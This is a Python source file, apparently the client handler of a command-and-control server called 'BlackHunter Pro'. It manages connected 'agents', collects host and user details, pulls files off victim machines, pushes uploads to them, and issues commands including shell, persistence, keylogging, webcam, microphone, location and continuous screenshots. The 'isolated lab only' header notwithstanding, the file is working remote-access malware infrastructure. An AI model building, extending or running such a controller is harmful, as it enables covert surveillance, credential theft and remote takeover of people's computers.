#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# c2_server/handler.py
# BlackHunter Pro - Client Handler
# Handles client communication, command processing, and file transfer
# Academic Penetration Testing Tool - Isolated Lab Only

import os
import sys
import json
import time
import socket
import base64
import hashlib
import threading
import traceback
from datetime import datetime
from queue import Queue, Empty

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# =============================================
# CONFIGURATION
# =============================================

BUFFER_SIZE = 65536
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
DOWNLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
COMMAND_TIMEOUT = 60
HEARTBEAT_INTERVAL = 30

# Create directories
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# =============================================
# COLORS
# =============================================

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    DIM = '\033[2m'
    RESET = '\033[0m'

C = Colors

# =============================================
# LOGGING
# =============================================

LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "handler.log")

def log(message, level="INFO"):
    """Log message"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    colors = {
        "INFO": C.CYAN,
        "OK": C.GREEN,
        "WARN": C.YELLOW,
        "ERROR": C.RED,
        "CMD": C.BLUE,
        "FILE": C.MAGENTA,
    }

    color = colors.get(level, C.WHITE)
    print(f"{color}[{timestamp}] [{level}]{C.RESET} {message}")

    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    except:
        pass

# =============================================
# MESSAGE PROTOCOL
# =============================================

class Protocol:
    """Message protocol for C2 communication"""

    # Message types
    TYPE_HANDSHAKE = "handshake"
    TYPE_INFO = "info"
    TYPE_COMMAND = "command"
    TYPE_RESULT = "result"
    TYPE_PING = "ping"
    TYPE_PONG = "pong"
    TYPE_FILE_START = "file_start"
    TYPE_FILE_CHUNK = "file_chunk"
    TYPE_FILE_END = "file_end"
    TYPE_ERROR = "error"
    TYPE_EXIT = "exit"

    # Commands
    CMD_SYSINFO = "sysinfo"
    CMD_WHOAMI = "whoami"
    CMD_PWD = "pwd"
    CMD_LS = "ls"
    CMD_PS = "ps"
    CMD_SCREENSHOT = "screenshot"
    CMD_IPCONFIG = "ipconfig"
    CMD_NETSTAT = "netstat"
    CMD_ENV = "env"
    CMD_DOWNLOAD = "download"
    CMD_UPLOAD = "upload"
    CMD_SHELL = "shell"
    CMD_EXIT = "exit"
    CMD_SLEEP = "sleep"
    CMD_PERSIST = "persist"
    CMD_KEYLOG_START = "keylog_start"
    CMD_KEYLOG_STOP = "keylog_stop"
    CMD_KEYLOG_DUMP = "keylog_dump"
    CMD_WEBCAM = "webcam"
    CMD_MIC = "mic"
    CMD_LOCATION = "location"
    CMD_SCREENSHOT_CONT = "screenshot_cont"

    @staticmethod
    def create_message(msg_type, **kwargs):
        """Create a protocol message"""
        message = {
            'type': msg_type,
            'timestamp': datetime.now().isoformat(),
        }
        message.update(kwargs)
        return message

    @staticmethod
    def encode(message):
        """Encode message for transmission"""
        if isinstance(message, dict):
            message = json.dumps(message)
        if isinstance(message, str):
            message = message.encode()
        return message

    @staticmethod
    def decode(data):
        """Decode received message"""
        if isinstance(data, bytes):
            data = data.decode('utf-8', errors='ignore')
        try:
            return json.loads(data)
        except json.JSONDecodeError:
            return {'type': 'unknown', 'raw': data}

    @staticmethod
    def pack(data):
        """Pack message with length prefix"""
        if isinstance(data, str):
            data = data.encode()
        length = len(data)
        return length.to_bytes(4, 'big') + data

    @staticmethod
    def unpack(sock):
        """Unpack length-prefixed message"""
        try:
            length_data = Handler.recv_exact(sock, 4)
            if not length_data:
                return None

            length = int.from_bytes(length_data, 'big')
            if length > BUFFER_SIZE:
                return None

            return Handler.recv_exact(sock, length)
        except:
            return None

# =============================================
# CLIENT HANDLER
# =============================================

class ClientHandler:
    """Handles communication with a single client"""

    def __init__(self, client_id, socket, address, server=None):
        self.client_id = client_id
        self.socket = socket
        self.address = address
        self.server = server

        self.info = {}
        self.status = "active"
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.last_command = None
        self.command_count = 0
        self.bytes_sent = 0
        self.bytes_received = 0

        self.lock = threading.Lock()
        self.running = True

        # Pending commands (waiting for response)
        self.pending_commands = {}
        self.pending_lock = threading.Lock()

        # File transfer state
        self.file_transfers = {}

        # Command history
        self.history = []

    # =============================================
    # CONNECTION HANDLING
    # =============================================

    def start(self):
        """Start handling client"""
        log(f"Handler started for {self.client_id}", "OK")

        try:
            # Send handshake
            self._send_handshake()

            # Wait for client info
            self._receive_info()

            # Main loop
            self._main_loop()

        except Exception as e:
            log(f"Handler error ({self.client_id}): {e}", "ERROR")
            traceback.print_exc()
        finally:
            self._cleanup()

    def _send_handshake(self):
        """Send handshake to client"""
        message = Protocol.create_message(
            Protocol.TYPE_HANDSHAKE,
            server="BlackHunter-C2",
            version="1.0",
            client_id=self.client_id,
        )

        self._send(message)
        log(f"Handshake sent to {self.client_id}", "INFO")

    def _receive_info(self):
        """Receive client system info"""
        try:
            data = Protocol.unpack(self.socket)

            if data is None:
                log(f"No info received from {self.client_id}", "WARN")
                return

            message = Protocol.decode(data)

            if message.get('type') == Protocol.TYPE_INFO:
                self.info = message.get('data', {})
                log(f"Client info received: {self.client_id}", "OK")

                # Log key info
                hostname = self.info.get('hostname', 'unknown')
                os_info = self.info.get('os', 'unknown')
                user = self.info.get('user', 'unknown')

                log(f"  Hostname: {hostname}", "INFO")
                log(f"  OS:       {os_info}", "INFO")
                log(f"  User:     {user}", "INFO")

        except Exception as e:
            log(f"Receive info failed: {e}", "ERROR")

    # =============================================
    # MAIN LOOP
    # =============================================

    def _main_loop(self):
        """Main message loop"""
        last_heartbeat = time.time()

        while self.running and self.status == "active":
            try:
                # Set timeout for non-blocking receive
                self.socket.settimeout(1.0)

                # Try to receive
                data = Protocol.unpack(self.socket)

                if data is not None:
                    self._handle_message(data)

                # Send heartbeat every 30 seconds
                now = time.time()
                if now - last_heartbeat > HEARTBEAT_INTERVAL:
                    self._send_ping()
                    last_heartbeat = now

                # Check for dead connection
                if self.status == "dead":
                    break

            except socket.timeout:
                continue
            except ConnectionResetError:
                log(f"Connection reset: {self.client_id}", "WARN")
                self.status = "dead"
                break
            except Exception as e:
                log(f"Main loop error ({self.client_id}): {e}", "ERROR")
                self.status = "dead"
                break

    def _handle_message(self, data):
        """Handle incoming message"""
        try:
            message = Protocol.decode(data)
            msg_type = message.get('type', 'unknown')

            self.bytes_received += len(data)
            self.last_seen = datetime.now()

            if msg_type == Protocol.TYPE_PONG:
                self._handle_pong(message)

            elif msg_type == Protocol.TYPE_RESULT:
                self._handle_result(message)

            elif msg_type == Protocol.TYPE_FILE_START:
                self._handle_file_start(message)

            elif msg_type == Protocol.TYPE_FILE_CHUNK:
                self._handle_file_chunk(message)

            elif msg_type == Protocol.TYPE_FILE_END:
                self._handle_file_end(message)

            elif msg_type == Protocol.TYPE_ERROR:
                self._handle_error(message)

            elif msg_type == Protocol.TYPE_EXIT:
                log(f"Client requested exit: {self.client_id}", "WARN")
                self.status = "disconnected"

            else:
                log(f"Unknown message type: {msg_type}", "WARN")

        except Exception as e:
            log(f"Message handler error: {e}", "ERROR")

    def _handle_pong(self, message):
        """Handle heartbeat response"""
        # Update last_seen (already done)
        pass

    def _handle_result(self, message):
        """Handle command result"""
        command = message.get('command', 'unknown')
        output = message.get('output', '')
        exit_code = message.get('exit_code', 0)
        duration = message.get('duration', 0)

        self.last_command = command

        # Notify pending
        with self.pending_lock:
            if command in self.pending_commands:
                event = self.pending_commands[command]['event']
                self.pending_commands[command]['result'] = message
                event.set()

        # Log result
        log(f"Result from {self.client_id}: '{command}' (exit: {exit_code}, {duration:.2f}s)", "CMD")

        # Display output
        if output:
            print(f"\n{C.GREEN}[{self.client_id}] {command}:{C.RESET}")
            print(f"{C.WHITE}{output[:2000]}{C.RESET}")
            if len(output) > 2000:
                print(f"{C.DIM}... (truncated, {len(output)} bytes total){C.RESET}")
            print()

        # Add to history
        self.history.append({
            'command': command,
            'output': output,
            'exit_code': exit_code,
            'timestamp': datetime.now().isoformat(),
        })

    def _handle_file_start(self, message):
        """Handle file transfer start"""
        file_id = message.get('file_id')
        filename = message.get('filename')
        filesize = message.get('filesize', 0)
        file_hash = message.get('hash', '')

        log(f"File transfer starting: {filename} ({filesize} bytes)", "FILE")

        # Initialize transfer
        self.file_transfers[file_id] = {
            'filename': filename,
            'filesize': filesize,
            'received': 0,
            'hash': file_hash,
            'chunks': [],
            'started_at': datetime.now(),
        }

    def _handle_file_chunk(self, message):
        """Handle file chunk"""
        file_id = message.get('file_id')
        chunk_data = message.get('data', '')
        chunk_index = message.get('index', 0)

        if file_id not in self.file_transfers:
            log(f"Unknown file transfer: {file_id}", "WARN")
            return

        transfer = self.file_transfers[file_id]

        try:
            chunk = base64.b64decode(chunk_data)
            transfer['chunks'].append((chunk_index, chunk))
            transfer['received'] += len(chunk)

            # Progress
            if transfer['filesize'] > 0:
                progress = (transfer['received'] / transfer['filesize']) * 100
                if transfer['received'] % (1024 * 1024) < len(chunk):  # Every MB
                    log(f"Progress: {progress:.1f}% ({transfer['received']}/{transfer['filesize']})", "FILE")

        except Exception as e:
            log(f"Chunk decode error: {e}", "ERROR")

    def _handle_file_end(self, message):
        """Handle file transfer end"""
        file_id = message.get('file_id')

        if file_id not in self.file_transfers:
            return

        transfer = self.file_transfers[file_id]
        filename = transfer['filename']

        # Sort chunks by index
        transfer['chunks'].sort(key=lambda x: x[0])

        # Reassemble file
        file_data = b''.join(chunk for _, chunk in transfer['chunks'])

        # Save file
        safe_filename = os.path.basename(filename)
        filepath = os.path.join(DOWNLOAD_DIR, safe_filename)

        try:
            with open(filepath, 'wb') as f:
                f.write(file_data)

            log(f"File saved: {filepath} ({len(file_data)} bytes)", "FILE")

            # Verify hash
            if transfer['hash']:
                computed_hash = hashlib.sha256(file_data).hexdigest()
                if computed_hash == transfer['hash']:
                    log(f"Hash verified: {computed_hash[:16]}...", "OK")
                else:
                    log(f"Hash mismatch! Expected: {transfer['hash'][:16]}..., Got: {computed_hash[:16]}...", "WARN")

            # Report
            duration = (datetime.now() - transfer['started_at']).total_seconds()
            speed = len(file_data) / duration if duration > 0 else 0
            log(f"Transfer complete: {filename} ({speed/1024:.1f} KB/s)", "OK")

        except Exception as e:
            log(f"File save error: {e}", "ERROR")

        del self.file_transfers[file_id]

    def _handle_error(self, message):
        """Handle error from client"""
        error = message.get('error', 'Unknown error')
        command = message.get('command', 'unknown')

        log(f"Client error ({self.client_id}): {command} - {error}", "ERROR")

    # =============================================
    # SEND COMMANDS
    # =============================================

    def send_command(self, command, wait_for_result=False, timeout=COMMAND_TIMEOUT):
        """Send command to client"""
        try:
            message = Protocol.create_message(
                Protocol.TYPE_COMMAND,
                command=command,
            )

            self._send(message)
            self.command_count += 1

            log(f"Command sent to {self.client_id}: {command}", "CMD")

            if wait_for_result:
                return self._wait_for_result(command, timeout)

            return True

        except Exception as e:
            log(f"Send command failed: {e}", "ERROR")
            return False

    def _wait_for_result(self, command, timeout):
        """Wait for command result"""
        event = threading.Event()

        with self.pending_lock:
            self.pending_commands[command] = {
                'event': event,
                'result': None,
            }

        if event.wait(timeout):
            with self.pending_lock:
                result = self.pending_commands[command]['result']
                del self.pending_commands[command]
            return result

        with self.pending_lock:
            if command in self.pending_commands:
                del self.pending_commands[command]

        return None

    def _send(self, message):
        """Send message to client"""
        with self.lock:
            data = Protocol.encode(message)
            packed = Protocol.pack(data)

            self.socket.sendall(packed)
            self.bytes_sent += len(packed)

    def _send_ping(self):
        """Send heartbeat ping"""
        try:
            message = Protocol.create_message(Protocol.TYPE_PING)
            self._send(message)
        except:
            self.status = "dead"

    # =============================================
    # FILE OPERATIONS
    # =============================================

    def download_file(self, remote_path):
        """Request file download from client"""
        log(f"Requesting download: {remote_path}", "FILE")

        command = f"download {remote_path}"
        return self.send_command(command)

    def upload_file(self, local_path, remote_path):
        """Upload file to client"""
        if not os.path.exists(local_path):
            log(f"Local file not found: {local_path}", "ERROR")
            return False

        try:
            with open(local_path, 'rb') as f:
                file_data = f.read()

            filesize = len(file_data)
            file_hash = hashlib.sha256(file_data).hexdigest()
            file_id = hashlib.md5(f"{local_path}{time.time()}".encode()).hexdigest()[:16]

            log(f"Uploading: {local_path} ({filesize} bytes)", "FILE")

            # Send start
            self._send(Protocol.create_message(
                Protocol.TYPE_FILE_START,
                file_id=file_id,
                filename=os.path.basename(remote_path),
                filepath=remote_path,
                filesize=filesize,
                hash=file_hash,
                direction="upload",
            ))

            # Send chunks
            chunk_size = 16384
            for i in range(0, filesize, chunk_size):
                chunk = file_data[i:i + chunk_size]
                chunk_b64 = base64.b64encode(chunk).decode()

                self._send(Protocol.create_message(
                    Protocol.TYPE_FILE_CHUNK,
                    file_id=file_id,
                    index=i // chunk_size,
                    data=chunk_b64,
                ))

                # Small delay to prevent overwhelming
                if (i // chunk_size) % 10 == 0:
                    time.sleep(0.01)

            # Send end
            self._send(Protocol.create_message(
                Protocol.TYPE_FILE_END,
                file_id=file_id,
            ))

            log(f"Upload complete: {local_path}", "OK")
            return True

        except Exception as e:
            log(f"Upload failed: {e}", "ERROR")
            return False

    # =============================================
    # INFO & STATUS
    # =============================================

    def get_info(self):
        """Get client information"""
        return {
            'id': self.client_id,
            'address': self.address[0],
            'port': self.address[1],
            'status': self.status,
            'connected_at': self.connected_at.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'last_command': self.last_command,
            'command_count': self.command_count,
            'bytes_sent': self.bytes_sent,
            'bytes_received': self.bytes_received,
            'info': self.info,
        }

    def show_info(self):
        """Display client info"""
        info = self.info
        uptime = datetime.now() - self.connected_at

        print(f"""
{C.CYAN}╔═══════════════════════════════════════════════════════╗
{C.CYAN}║{C.WHITE}              CLIENT: {self.client_id:<31} {C.CYAN}║
{C.CYAN}╠═══════════════════════════════════════════════════════╣
{C.CYAN}║{C.GREEN}  IP Address:     {C.WHITE}{self.address[0]:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Status:         {C.WHITE}{self.status:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Connected:      {C.WHITE}{self.connected_at.strftime('%Y-%m-%d %H:%M:%S'):<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Uptime:         {C.WHITE}{str(uptime).split('.')[0]:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Last Command:   {C.WHITE}{(self.last_command or 'None')[:35]:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Commands:       {C.WHITE}{self.command_count:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Sent:           {C.WHITE}{self._format_bytes(self.bytes_sent):<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Received:       {C.WHITE}{self._format_bytes(self.bytes_received):<35}{C.CYAN}║""")

        if info:
            print(f"{C.CYAN}╠═══════════════════════════════════════════════════════╣")
            print(f"{C.CYAN}║{C.WHITE}              SYSTEM INFORMATION                      {C.CYAN}║")
            print(f"{C.CYAN}╠═══════════════════════════════════════════════════════╣")

            for key, value in info.items():
                key_str = str(key)[:15]
                val_str = str(value)[:35]
                print(f"{C.CYAN}║{C.GREEN}  {key_str:<15}{C.WHITE}{val_str:<35}{C.CYAN}║")

        print(f"{C.CYAN}╚═══════════════════════════════════════════════════════╝{C.RESET}")

    def _format_bytes(self, bytes_val):
        """Format bytes for display"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_val < 1024:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024
        return f"{bytes_val:.2f} TB"

    def show_history(self):
        """Display command history"""
        if not self.history:
            log("No command history", "WARN")
            return

        print(f"\n{C.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"║{C.WHITE}            COMMAND HISTORY ({len(self.history)})                    {C.CYAN}║")
        print(f"╚═══════════════════════════════════════════════════════╝{C.RESET}\n")

        for i, entry in enumerate(self.history[-20:], 1):
            timestamp = entry['timestamp'][11:19]
            command = entry['command'][:50]
            exit_code = entry['exit_code']

            color = C.GREEN if exit_code == 0 else C.RED
            print(f"{C.DIM}[{timestamp}]{C.RESET} {color}({exit_code}){C.RESET} {command}")

        print()

    # =============================================
    # CLEANUP
    # =============================================

    def _cleanup(self):
        """Clean up handler resources"""
        self.running = False
        self.status = "disconnected"

        try:
            self.socket.close()
        except:
            pass

        log(f"Handler stopped: {self.client_id}", "INFO")

    def disconnect(self):
        """Disconnect client"""
        try:
            self._send(Protocol.create_message(Protocol.TYPE_EXIT))
            time.sleep(0.5)
        except:
            pass

        self._cleanup()

    def recv_exact(self, sock, n):
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

# =============================================
# HANDLER MANAGER
# =============================================

class HandlerManager:
    """Manages multiple client handlers"""

    def __init__(self):
        self.handlers = {}
        self.lock = threading.Lock()
        self.counter = 0

    def create_handler(self, socket, address, server=None):
        """Create a new handler"""
        with self.lock:
            self.counter += 1
            client_id = f"agent_{self.counter:03d}"

            handler = ClientHandler(client_id, socket, address, server)
            self.handlers[client_id] = handler

        # Start handler thread
        thread = threading.Thread(target=handler.start, daemon=True)
        thread.start()

        return handler

    def get_handler(self, client_id):
        """Get handler by ID"""
        with self.lock:
            return self.handlers.get(client_id)

    def remove_handler(self, client_id):
        """Remove handler"""
        with self.lock:
            if client_id in self.handlers:
                del self.handlers[client_id]

    def list_handlers(self):
        """List all handlers"""
        with self.lock:
            return list(self.handlers.values())

    def broadcast(self, command):
        """Broadcast command to all handlers"""
        handlers = self.list_handlers()

        for handler in handlers:
            if handler.status == "active":
                handler.send_command(command)

    def stop_all(self):
        """Stop all handlers"""
        handlers = self.list_handlers()

        for handler in handlers:
            handler.disconnect()

        with self.lock:
            self.handlers.clear()

# =============================================
# ALIAS FOR COMPATIBILITY
# =============================================

Handler = ClientHandler

# =============================================
# EXPORTS
# =============================================

__all__ = [
    'Protocol',
    'ClientHandler',
    'HandlerManager',
    'Handler',
    'log',
]